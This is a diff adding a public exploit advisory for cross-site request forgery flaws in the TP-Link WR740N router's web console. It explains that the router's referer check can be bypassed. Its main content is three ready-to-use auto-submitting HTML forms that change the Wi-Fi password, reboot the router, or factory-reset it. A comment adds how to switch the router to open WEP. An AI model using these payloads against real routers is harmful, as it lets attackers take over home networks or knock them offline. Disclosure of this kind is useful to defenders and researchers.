@@ -1,0 +1,89 @@
+# Exploit Title: TPLINK WR740N Multiple CSRF Vulnerabilities
+# Date: 11/24/2013
+# Author: SaMaN( @samanL33T )
+# Vendor Homepage: http://tplink.com
+# Category: Hardware/Wireless Router
+# Firmware Version: 3.16.6 Build 130529 Rel.47286n and below
+# Tested on: WR740N/WR740ND (May be possible on other models)
+---------------------------------------------------
+ 
+Technical Details
+~~~~~~~~~~~~~~~~~~
+TPLINK WIreless Router WR740N has a Cross Site Request Forgery Vulnerability in its Web Console. Attacker can easily change Wireless password,Reboot Router,Change Settings by simply making the user visit a CSRF link.
+
+Application uses "HTTP-REFERER" check functionality to check for CSRF attacks. But it can easily be bypassed using the "Referer" parameter with value set to target's I.P in the GET request.
+
+
+Exploit Code 
+~~~~~~~~~~~~~
+
+Change WPA/WPA2 password by CSRF
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+<html>
+<body onload="document.form.submit();">
+<form action="http://[TARGET/IP]/userRpm/WlanSecurityRpm.htm"
+method="GET" name="form">
+<input type="hidden" name="secType" value="3">
+<input type="hidden" name="pskSecOpt" value="3">
+<input type="hidden" name="pskCipher" value="3">
+<input type="hidden" name="pskSecret" value="[WPA/WPA2_PASSWORD]">
+<input type="hidden" name="interval" value="0">
+<input type="hidden" name="wpaSecOpt" value="3">
+<input type="hidden" name="wpaCipher" value="1">
+<input type="hidden" name="radiusIP" value="">
+<input type="hidden" name="rediusPort" value="1812">
+<input type="hidden" name="radiusSecret" value="">
+<input type="hidden" name="IntervalWpa" value="0">
+<input type="hidden" name="webSecOpt" value="1">
+<input type="hidden" name="keytype" value="1">
+<input type="hidden" name="keynum" value="1">
+<input type="hidden" name="key1" value="">
+<input type="hidden" name="length1" value="0">
+<input type="hidden" name="key2" value="">
+<input type="hidden" name="length2" value="0">
+<input type="hidden" name="key3" value="">
+<input type="hidden" name="length3" value="0">
+<input type="hidden" name="key4" value="">
+<input type="hidden" name="length4" value="0">
+<input type="hidden" name="Save" value="Save">
+<input type="hidden" name="Referer" value="http://[TARGET/IP]/">
+</form>
+</body>
+</html>
+
+
+#For Changing the Security to Open WEP, simply change "secType" value to 1.
+
+Reboot Router by CSRF
+~~~~~~~~~~~~~~~~~~~~~
+
+<html>
+<body onload="document.form.submit();">
+<form action="http://[TARGET/IP]/userRpm/SysRebootRpm.htm"
+method="GET" name="form">
+<input type="hidden" name="Reboot" value="Reboot">
+<input type="hidden" name="Referer" value="http://[TARGET/IP]/">
+</form>
+</body>
+</html>
+
+
+Factory Reset the Router
+~~~~~~~~~~~~~~~~~~~~~~~~
+
+<html>
+<body onload="document.form.submit();">
+<form action="http://[TARGET/IP]/userRpm/RestoreDefaultCfgRpm.htm"
+method="GET" name="form">
+<input type="hidden" name="Restorefactory" value="Restore">
+<input type="hidden" name="Referer" value="http://[TARGET/IP]/">
+</form>
+</body>
+</html>
+
+
+
+--
+SaMaN
+twitter : @samanL33T <https://twitter.com/samanL33T>
